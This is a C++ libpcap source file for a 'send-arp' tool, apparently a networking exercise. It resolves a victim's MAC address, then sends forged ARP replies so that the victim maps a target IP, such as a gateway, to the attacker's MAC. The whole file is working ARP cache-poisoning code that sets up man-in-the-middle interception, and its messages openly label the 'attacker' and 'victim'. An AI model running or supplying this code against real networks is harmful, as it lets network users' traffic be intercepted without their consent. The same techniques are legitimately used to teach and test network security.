#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip2> <target ip2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool getMyMac(const char* dev, uint8_t* mac){
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock < 0) return false;

	struct ifreq ifr;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ);
	if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
		close(sock);
		return false;
	}

	memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
	close(sock);
	return true;
}

bool getSenderMac(pcap_t* handle, const char* dev, Mac myMac, Ip myIp, Ip senderIp, Mac& senderMac) {
	EthArpPacket packet{};
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = myMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = myMac;
	packet.arp_.sip_ = htonl(myIp);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(senderIp);

	if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) != 0) {
		fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
		return false;
	}

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* recvPacket;
		int res = pcap_next_ex(handle, &header, &recvPacket);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;

		EthArpPacket* recv = (EthArpPacket*)recvPacket;

		if (recv->eth_.type_ == htons(EthHdr::Arp) &&
				recv->arp_.op_ == htons(ArpHdr::Reply) &&
				recv->arp_.sip_ == Ip(htonl(senderIp))) {
			senderMac = recv->arp_.smac_;
			return true;
		}
	}

	return false;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	uint8_t attackerMacRaw[6]={0};
	if (!getMyMac(dev, attackerMacRaw)) {
		fprintf(stderr, "Failed to get attacker MAC\n");
		return EXIT_FAILURE;
	}
	Mac attackerMac(attackerMacRaw);

	Ip attackerIp("1.2.3.4");

	for(int i = 2; i < argc; i += 2){
		Ip senderIp(argv[i]);
		Ip targetIp(argv[i + 1]);
		Mac senderMac;

		if (!getSenderMac(pcap, dev, attackerMac, attackerIp, senderIp, senderMac)) {
			fprintf(stderr, "Failed to get sender MAC for IP: %s\n", argv[i]);
			continue;
		}

		EthArpPacket packet{};
		packet.eth_.dmac_ = senderMac;
		packet.eth_.smac_ = attackerMac;
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::Size;
		packet.arp_.pln_ = Ip::Size;
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.arp_.smac_ = attackerMac;
		packet.arp_.sip_ = htonl(targetIp);
		packet.arp_.tmac_ = senderMac;
		packet.arp_.tip_ = htonl(senderIp);

		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		}
		else{
			printf("[+] Sent spoofed ARP packet: Victim %s → thinks %s is at attacker MAC\n", argv[i], argv[i+1]);
		}
	}


	pcap_close(pcap);
	return 0;	
}
